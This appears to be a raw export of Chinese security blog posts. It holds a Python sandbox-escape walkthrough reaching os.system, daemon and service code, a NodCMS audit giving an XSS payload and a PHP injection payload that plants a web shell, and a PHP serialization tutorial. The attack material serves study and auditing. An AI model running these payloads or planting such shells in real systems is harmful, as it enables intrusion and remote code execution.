&lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;] 12345678910111213&gt;&gt;&gt; ().__class__.__base__.__subclasses__().index(file)40&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; f=().__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f('test.txt','r').read()'this is a test!'&gt;&gt;&gt; print (f('test.txt','r').read())this is a test! os模块system同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽,先找到os 12345678910111213141516&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60]&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys().index('linecache')25&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25]'linecache'&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt; 然后找system 12345678910111213141516171819&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')79&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&gt;&gt;&gt; a&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; s=a.__dict__.keys()&gt;&gt;&gt; s['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; s=a.__dict__.keys().index('system')&gt;&gt;&gt; s79&gt;&gt;&gt; s=a.__dict__.keys()[79]&gt;&gt;&gt; s'system' 读取文件 123456789101112131415&gt;&gt;&gt; s=a.__dict__.values()[79]&gt;&gt;&gt; s&lt;built-in function system&gt;&gt;&gt;&gt; s('dir') 驱动器 C 中的卷是 WIN 7 卷的序列号是 28DD-3D6F C:\Users\Administrator\Desktop 的目录2016/10/24 周一 上午 10:19 &lt;DIR&gt; .2016/10/24 周一 上午 10:19 &lt;DIR&gt; ..2016/10/24 周一 上午 10:19 15 test.txt&gt;&gt;&gt; s('type test.txt')this is a test!0 或者像下面一样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&gt;&gt;&gt; print (().__class__)&lt;type 'tuple'&gt;&gt;&gt;&gt; print (().__class__.__base__)&lt;type 'object'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__)&lt;built-in method __subclasses__ of type object at 0x1E229708&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__())[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60])&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys())['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25])linecache&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'])&lt;module 'linecache' from 'C:\mySoft\python2.7.9\lib\linecache.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys())['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()[12])os&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12])&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys())['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys()[79])system&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.values()[79]('type test.txt'))this is a test!0 当然，还有很多方式]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>code execution</tag>
        <tag>excape</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 版的守护进程和Windows服务]]></title>
    <url>%2F2016%2F10%2F22%2Fpython-linux-daemon-windows-service%2F</url>
    <content type="text"><![CDATA[概述最近在写python脚本时需要用到Linux的守护进程以及Windows下的服务进程。百度了挺多，都记下来，以后如果再次遇到这种问题就不用去找了。 Linux守护进程最重要的特性是后台运行；它必须与其运行前的环境隔离开来，这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等；它可以在系统启动时从启动脚本/etc/rc.d中启动，可以由inetd守护进程启动，也可以有作业规划进程crond启动，还可以由用户终端（通常是shell）执行。Python有时需要保证只运行一个脚本实例，以避免数据的冲突。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加守护进程（linux）'''import osimport datetimeimport timeimport sysimport atexitimport string import subprocessfrom signal import SIGTERM from lib.function import confdealclass Daemon: #需要获取调试信息，改为stdin='/dev/stdin', stdout='/dev/stdout', stderr='/dev/stderr'，以root身份运行。 def __init__(self, scriptPath,pidfile, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'): self.stdin = stdin self.stdout = stdout self.stderr = stderr self.pidfile = pidfile self.scriptPath = scriptPath def _daemonize(self): try: pid = os.fork() #第一次fork，生成子进程，脱离父进程 if pid &gt; 0: sys.exit(0) #退出主进程 except OSError, e: sys.stderr.write('fork #1 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) os.chdir("/") #修改工作目录 os.setsid() #设置新的会话连接 os.umask(0) #重新设置文件创建权限 try: pid = os.fork() #第二次fork，禁止进程打开终端 if pid &gt; 0: sys.exit(0) except OSError, e: sys.stderr.write('fork #2 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) #重定向文件描述符 sys.stdout.flush() sys.stderr.flush() si = file(self.stdin, 'r') so = file(self.stdout, 'a+') se = file(self.stderr, 'a+', 0) os.dup2(si.fileno(), sys.stdin.fileno()) os.dup2(so.fileno(), sys.stdout.fileno()) os.dup2(se.fileno(), sys.stderr.fileno()) #注册退出函数，根据文件pid判断是否存在进程 atexit.register(self.delpid) pid = str(os.getpid()) file(self.pidfile,'w+').write('%s\n' % pid) def delpid(self): os.remove(self.pidfile) def start(self): #检查pid文件是否存在以探测是否存在进程 try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if pid: message = 'pidfile %s already exist. Daemon already running!\n' sys.stderr.write(message % self.pidfile) sys.exit(1) #启动监控 self._daemonize() self._run() def stop(self): #从pid文件中获取pid try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if not pid: #重启不报错 message = 'pidfile %s does not exist. Daemon not running!\n' sys.stderr.write(message % self.pidfile) return #杀进程 # 我的程序需要，只是获取端口号 remoteDic = confdeal.getConfRemote(self.scriptPath) if remoteDic: # 根据端口号杀掉子进程 ret = os.popen('netstat -antup | grep \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr.split('/')[0] pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("kill "+pidStr) try: while 1: os.kill(pid, SIGTERM) time.sleep(0.1) #os.system('hadoop-daemon.sh stop datanode') #os.system('hadoop-daemon.sh stop tasktracker') #os.remove(self.pidfile) except OSError, err: err = str(err) if err.find('No such process') &gt; 0: if os.path.exists(self.pidfile): os.remove(self.pidfile) else: print str(err) sys.exit(1) def restart(self): self.stop() self.start() def _run(self): # 开启子进程 cmd = 'cd ' + self.scriptPath +' &amp;&amp; python test.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) daemon = Daemon(scriptPath,'/tmp/watch_process.pid', stdout = '/tmp/watch_stdout.log') if len(sys.argv) == 2: if 'start' == sys.argv[1]: daemon.start() elif 'stop' == sys.argv[1]: daemon.stop() elif 'restart' == sys.argv[1]: daemon.restart() else: print 'unknown command' sys.exit(2) sys.exit(0) else: print 'usage: %s start|stop|restart' % sys.argv[0] sys.exit(2) WindowsPython程序作为Windows服务启动，需要安装pywin32包。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加windows服务'''import pythoncomimport win32serviceutilimport win32serviceimport win32eventimport servicemanagerimport socketimport osimport sysimport subprocessimport timefrom lib.function import confdealclass Daemon (win32serviceutil.ServiceFramework): _svc_name_ = "Test Service" #服务名 _svc_display_name_ = "Test Service" #服务显示名称 _svc_description_ = "Test Service ." #服务描述 def __init__(self,args): win32serviceutil.ServiceFramework.__init__(self,args) self.hWaitStop = win32event.CreateEvent(None,0,0,None) socket.setdefaulttimeout(60) def SvcDoRun(self): servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_,'')) self.monitorProcess() # 创建子进程 def monitorProcess(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): cmd = 'cd '+scriptPath+' &amp;&amp; python promain.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10) win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE) # 结束子进程 def SvcStop(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): remoteDic = confdeal.getConfRemote(scriptPath) if remoteDic: ret = os.popen('netstat -ano | findstr \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("taskkill /F /T /PID "+pidStr) else : exit() self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) win32event.SetEvent(self.hWaitStop) self.ReportServiceStatus(win32service.SERVICE_STOPPED)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) with open('C:\\filemonitor', 'w') as f: f.write(scriptPath) confdeal.initConf(scriptPath) win32serviceutil.HandleCommandLine(Daemon) 然后以下命令： 123456789101112# 安装服务python PythonService.py install# 让服务自动启动python PythonService.py --startup auto install # 启动服务python PythonService.py start# 重启服务python PythonService.py restart# 停止服务python PythonService.py stop# 删除/卸载服务python PythonService.py remove 这里我要提一下，python脚本文件调用windows api后，他的运行路径会发生变化，所以我这里把脚本路径存到了一个绝对地址的文件里，然后再取出来。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>python</tag>
        <tag>daemon</tag>
        <tag>service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php codeigniter nodcms 代码审计]]></title>
    <url>%2F2016%2F10%2F11%2Fphp-codeigniter-nodcms-audit%2F</url>
    <content type="text"><![CDATA[概述CMS代码审计还未入门，然后CI框架学的还不行，代码审计一脸懵逼。 前台反射型XSS1234567891011121314151617181920212223242526272829function search($lang)&#123; $this-&gt;preset($lang); $search_text = isset($_GET["filter"])?str_replace("'","",$this-&gt;input-&gt;get("filter")):""; //把单引号去掉 if($search_text!="")&#123; $search = explode("_",$search_text); if(count($search)!="")&#123; $limit = 20; if(isset($_GET["offset"]) &amp;&amp; is_numeric($_GET["offset"]))&#123; $offset = $_GET["offset"]; &#125;else&#123; $offset = 0; &#125; $this-&gt;data['data'] = $this-&gt;NodCMS_general_model-&gt;searchExtension($search,$limit,$offset); &#125; $this-&gt;data['search_word']=str_replace("_"," ",$search_text); $this-&gt;data['text_search']=$search; $this-&gt;data['text_replace']=array_map(function($value)&#123; return "&lt;strong&gt;".$value."&lt;/strong&gt;"; &#125;,$search); &#125;else&#123; $this-&gt;data['data'] = array(); &#125; $this-&gt;data['title']=str_replace("_"," ",$search_text); //把下划线替换为空格，并没有进行XSS过滤，直接打印出来，形成xss if(isset($_GET["ajax"]))&#123; echo $this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search_ajax',$this-&gt;data,true); &#125;else&#123; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data,''); &#125;&#125; 这里，只是去掉了单引号、下划线虽然难以进行sql注入攻击，但是XSS还是可以的。 1payload为：http://localhost:8000/en/search?filter=des&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt; 后台php 代码注入位置是修改语言的地方，其中一个URL为http://localhost:8000/admin/edit_lang_file/1/en。 先看截图： 然后上关键代码，关键地方打上注释了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687function edit_lang_file($id,$file_name)&#123; $this-&gt;data['data']=$this-&gt;NodCMS_general_admin_model-&gt;get_language_detail($id); if($this-&gt;data['data']==null || !file_exists(getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'))&#123; $this-&gt;session-&gt;set_flashdata('error', _l('URL-Request was not exists!',$this)); redirect(base_url()."admin/language"); &#125; $this-&gt;load-&gt;library('Get_lang_in_array'); $CI = new Get_lang_in_array(); //实例化Get_lang_in_array()函数 $this-&gt;data['lang_list'] = $CI-&gt;load($file_name,$this-&gt;data['data']['language_name']); //加载en_lang.php if(count($this-&gt;data['lang_list'])==0)&#123; $defaultLangFileName = strlen($file_name)==2?$_SESSION['language']['code']:$file_name; $this-&gt;data['lang_list'] = $CI-&gt;load($defaultLangFileName,$_SESSION['language']['language_name']); &#125; if(isset($_POST['data']))&#123; if ($this-&gt;session-&gt;userdata['group']==1) &#123; $post_data = $this-&gt;input-&gt;post('data'); //直接获取post值 $i=0; $fileContent = "&lt;?php\n"; foreach ($this-&gt;data['lang_list'] as $key=&gt;&amp;$val) &#123; $fileContent .= '$lang["'.$key.'"] = "'.$post_data[$i].'";'."\n"; //拼接代码 $val = $post_data[$i]; $i++; &#125; $file = getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'; if(file_exists($file))&#123; file_put_contents($file, $fileContent); // 把代码写入文件 &#125; $this-&gt;session-&gt;set_flashdata('success', _l('Edit language file successfully!',$this)); redirect(base_url()."admin/edit_lang_file/".$id.'/'.$file_name); &#125;else&#123; $this-&gt;session-&gt;set_flashdata('error', _l('This request is just fore real admin.',$this)); redirect(base_url()."admin/language"); &#125; &#125; $this-&gt;data['file_name'] = $file_name; $this-&gt;data['languages']=$this-&gt;NodCMS_general_admin_model-&gt;get_all_language(); $this-&gt;data['title'] = _l("Edit language file",$this); $this-&gt;data['page'] = "edit lang file"; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/language_edit_file',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data);&#125;function load($langfile = '', $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '') &#123; $langfile = str_replace('.php', '', $langfile); if ($add_suffix == TRUE) &#123; $langfile = str_replace('_lang.', '', $langfile) . '_lang'; &#125; $langfile .= '.php'; if (in_array($langfile, $this-&gt;is_loaded, TRUE)) &#123; return; &#125; $config = &amp; get_config(); if ($idiom == '') &#123; $deft_lang = (!isset($config['language'])) ? 'english' : $config['language']; $idiom = ($deft_lang == '') ? 'english' : $deft_lang; &#125; if ($alt_path != '' &amp;&amp; file_exists($alt_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($alt_path . 'language/' . $idiom . '/' . $langfile); &#125; else &#123; $found = FALSE; foreach (get_instance()-&gt;load-&gt;get_package_paths(TRUE) as $package_path) &#123; if (file_exists($package_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($package_path . 'language/' . $idiom . '/' . $langfile); $found = TRUE; break; &#125; &#125; if ($found !== TRUE) &#123; show_error('Unable to load the requested language file: language/' . $idiom . '/' . $langfile); &#125; &#125; if (!isset($lang)) &#123; log_message('error', 'Language file contains no data: language/' . $idiom . '/' . $langfile); return; &#125; if ($return == TRUE) &#123; return $lang; &#125; $this-&gt;is_loaded[] = $langfile; //加载 en_lang.php文件，即执行代码。 $this-&gt;language = array(); $this-&gt;language = $lang; return $this-&gt;language; unset($lang); log_message('debug', 'Language file loaded: language/' . $idiom . '/' . $langfile); return TRUE;&#125; 代码比较复杂，加上对CI框架不是很了解，看的比较久。由于这里没有对post提交的参数进行任何的字符过滤，直接进行拼接，然后保存到文件。之后重新请求时，实例化了Get_lang_in_array()这个函数，而这个函数主要加载了en_lang.php这个文件，也就是执行了这个文件，形成代码注入，从而gershell。 1payload为：All"; file_put_contents('shell.php', '&lt;?php $_GET[a]($_GET[b]);?&gt;');;$t="111 shell.php文件会生成在根目录下，连菜刀就可以了。 存储型XSS和前台差不多，没有过滤就存入了数据库，造成XSS。]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>php</tag>
        <tag>codeigniter</tag>
        <tag>nodcms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 序列化以及 magic 函数]]></title>
    <url>%2F2016%2F10%2F09%2Fphp-serialize-magic%2F</url>
    <content type="text"><![CDATA[概述有时候需要把一个对象在网络上传输，为了方便传输，可以把整个对象转化为二进制串，等到达另一端时，再还原为原来的对象，这个过程称之为也叫序列化。 有两种情况我们必须把对象也叫序列化，第一种情况就是把一个对象在网络中传输的时候要将对象也叫序列化，第二种情况就是把对象写入文件或是数据库的时候用到也叫序列化。 串行化有两个过程，一个是序列化，就是把对象转化为二进制的字符串，我们使用serialize()函数来序列化一个对象，另一个是反序列化，就是把对象转化的二进制字符串再转化为对象， 我们使用unserialize()函数来反序列化一个对象。 详情1234567891011121314151617181920212223242526&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20my friends has Alice Jhon . 至于序列化语法解析，看如下代码： 1234567891011121314151617181920&lt;?phperror_reporting(7);class Person&#123; public $name; private $age; protected $friends; var $job; function __construct($name = "Bob", $age = 20,$friends =array("Alice","Jhon") ,$job=Null) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; $this-&gt;job = $job; &#125;&#125;$p1 = new Person();$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2?&gt; 具体输出： 1O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 需要序列化一个类的话，首先PHP会先将类名序列化。格式为 O:类名长度:”类名”:值:{} ,大致Fuzzy了下，这个类名长度前可以有%2b、%30 这些符号也可以反序列化。其他的格式可以自己对照了解。如： 1O:+6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 1O:06:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 以下是zval对应的类型和键对照表1234567891011数组中二次赋值(&amp;): R; 对象二次赋值 : r; NULL : N; true : b:1; false : b:0; Long : i; Double : d; String : s/S; Class : C; Array : a; Object : O; 可以看出变量不同的属性也有着不同的格式 123public : key; protected : *key; private : 对象名key; 